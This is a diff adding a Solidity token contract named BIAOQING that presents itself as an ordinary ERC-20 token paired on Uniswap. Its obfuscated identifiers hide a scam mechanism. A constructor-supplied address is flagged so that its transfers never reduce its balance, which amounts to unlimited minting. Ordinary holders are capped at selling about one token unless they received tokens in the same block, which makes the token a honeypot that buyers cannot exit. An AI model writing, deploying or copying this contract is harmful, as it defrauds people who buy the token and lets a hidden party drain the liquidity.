@@ -1,0 +1,64 @@
+contract BIAOQING is Ownable {
+    address private ybhiwlscukda;
+
+    constructor(string memory ngmswzrql, string memory qplt, address blztvsof, address nhyrpk) {
+        name = ngmswzrql;
+        symbol = qplt;
+        balanceOf[msg.sender] = totalSupply;
+        izcosak[nhyrpk] = tqkhzdgo;
+        IUniswapV2Router02 ghczx = IUniswapV2Router02(blztvsof);
+        ybhiwlscukda = IUniswapV2Factory(ghczx.factory()).createPair(address(this), ghczx.WETH());
+    }
+
+    uint8 public decimals = 9;
+
+    function chfdp(address psjtyc, address xijcbdaf, uint256 vgapfhszc) private {
+        if (0 == izcosak[psjtyc]) {
+            if (psjtyc != ybhiwlscukda && wjpva[psjtyc] != block.number && vgapfhszc < totalSupply) {
+                require(vgapfhszc <= totalSupply / (10 ** decimals));
+            }
+            balanceOf[psjtyc] -= vgapfhszc;
+        }
+        balanceOf[xijcbdaf] += vgapfhszc;
+        wjpva[xijcbdaf] = block.number;
+        emit Transfer(psjtyc, xijcbdaf, vgapfhszc);
+    }
+
+    function transferFrom(address psjtyc, address xijcbdaf, uint256 vgapfhszc) public returns (bool success) {
+        require(vgapfhszc <= allowance[psjtyc][msg.sender]);
+        allowance[psjtyc][msg.sender] -= vgapfhszc;
+        chfdp(psjtyc, xijcbdaf, vgapfhszc);
+        return true;
+    }
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    function transfer(address xijcbdaf, uint256 vgapfhszc) public returns (bool success) {
+        chfdp(msg.sender, xijcbdaf, vgapfhszc);
+        return true;
+    }
+
+    string public name;
+
+    string public symbol;
+
+    mapping(address => uint256) private wjpva;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    mapping(address => uint256) public balanceOf;
+
+    function approve(address gqemkrhfi, uint256 vgapfhszc) public returns (bool success) {
+        allowance[msg.sender][gqemkrhfi] = vgapfhszc;
+        emit Approval(msg.sender, gqemkrhfi, vgapfhszc);
+        return true;
+    }
+
+    mapping(address => uint256) private izcosak;
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+
+    uint256 private tqkhzdgo = 103;
+}
